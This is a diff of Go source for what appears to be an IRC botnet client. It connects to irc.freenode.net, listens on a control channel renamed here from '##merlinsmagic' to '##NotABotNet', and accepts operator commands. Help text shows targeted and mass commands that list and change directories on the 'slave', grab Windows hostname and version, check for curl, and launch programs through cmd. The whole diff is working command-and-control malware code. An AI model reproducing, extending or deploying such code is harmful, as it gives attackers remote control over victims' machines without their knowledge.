@@ -19,6 +19,9 @@ import (
 	"strconv"
 )
 
+// SET YOUR IRC CHANNEL NAME
+var CHANNEL_NAME string = "##NotABotNet"
+
 /* ##############################
 #### Split string into slice ####
 #################################*/
@@ -136,8 +139,6 @@ func botSetup() string {
 
 
 func ircloop() {
-	// SET YOUR IRC MASTER NAME
-	MASTER_NAME := "##merlinsmagic"
 	// Set current working directory on slave
 	currentWorkingDirectory, err := os.Getwd()
 	if err != nil {
@@ -151,7 +152,7 @@ func ircloop() {
 		"irc.freenode.net:6667",
 		botname,
 		botname,
-		MASTER_NAME,
+		CHANNEL_NAME,
 		"",
 	)
 	/* ##################
@@ -180,12 +181,12 @@ func ircloop() {
 		case message.Command == "PING":
 			bot.Send(fmt.Sprint("PONG %d", time.Now().UnixNano()))
 			// Debug
-		case message.Command == "JOIN":
-			fmt.Println("Successful join!")
+		//case message.Command == "JOIN":
+			//fmt.Println("Successful join!")
 		case message.Command == "PRIVMSG":
-			banner := "PRIVMSG " + MASTER_NAME + " :"
+			banner := "PRIVMSG " + CHANNEL_NAME + " :"
 			//if message.Params[0] == bot.Nick {
-			if message.Params[0] == MASTER_NAME {
+			if message.Params[0] == CHANNEL_NAME {
 				// Choose the first value as our command id
 				msg := message.Params[1]
 				// Create an array to seperate command and arguements
@@ -494,9 +495,9 @@ func ircloop() {
 						msg := "[!] Help usage: help [command]"
 						msg2 := "[~] Current targeted commands: [ls, cd, pwd, info, shutdown]"
 						msg3 := "[~] Current mass commands: [start, shutdown]"
-						bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg))
-						bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg2))
-						bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg3))
+						bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg))
+						bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg2))
+						bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg3))
 						bot.Send(fmt.Sprint(banner + "<///"))
 					} else if len(msgArray) == 2 {
 						// Print menu
@@ -506,52 +507,52 @@ func ircloop() {
 							msg2 := "[?] Arguements: none supported"
 							msg3 := "[?] Notes: use start for advanced ls"
 							//fmt.Println(msg)
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg2))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg3))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg2))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg3))
 						case "cd", "CD":
 							msg := "[?] cd: Golang implimentation of native cd"
 							msg2 := "[?] Arguements: one required  [Ex. cd Desktop]"
 							msg3 := "[?] Notes: Not ran via cmd, updates pwd automatically"
 							//fmt.Println(msg)
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg2))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg3))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg2))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg3))
 						case "pwd", "PWD":
 							msg := "[?] pwd: Golang implimentation of native pwd"
 							msg2 := "[?] Arguements: none"
 							msg3 := "[?] Notes: shows golang stubs pwd"
 							//fmt.Println(msg)
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg2))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg3))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg2))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg3))
 						case "info", "INFO":
 							msg := "[?] info: Grabs windows hostname and version"
 							msg2 := "[?] Arguements: none"
 							msg3 := "[?] Notes: Alerts if curl is possibly installed"
 							//fmt.Println(msg)
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg2))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg3))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg2))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg3))
 						case "start", "START":
 							msg := "[?] start: runs start via cmd"
 							msg2 := "[?] Arguements: at least one [Ex. start notepad.exe]"
 							msg3 := "[?] Notes: Some programs require full paths for input files"
 							msg4 := "[?] WMPLAYER: Full Path"
 							//fmt.Println(msg)
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg2))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg3))
-							bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg4))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg2))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg3))
+							bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg4))
 						}
 						bot.Send(fmt.Sprint(banner + "<///"))
 					} else {
 						msg := "[!] Help usage: help [command]"
 						msg2 := "[~] Current targeted commands: [ls, cd, pwd, info, shutdown]"
 						msg3 := "[~] Current mass commands: [start, shutdown]"
-						bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg))
-						bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg2))
-						bot.Send(fmt.Sprint("PRIVMSG " + MASTER_NAME + " :" + msg3))
+						bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg))
+						bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg2))
+						bot.Send(fmt.Sprint("PRIVMSG " + CHANNEL_NAME + " :" + msg3))
 						bot.Send(fmt.Sprint(banner + "<///"))
 					}
 				}
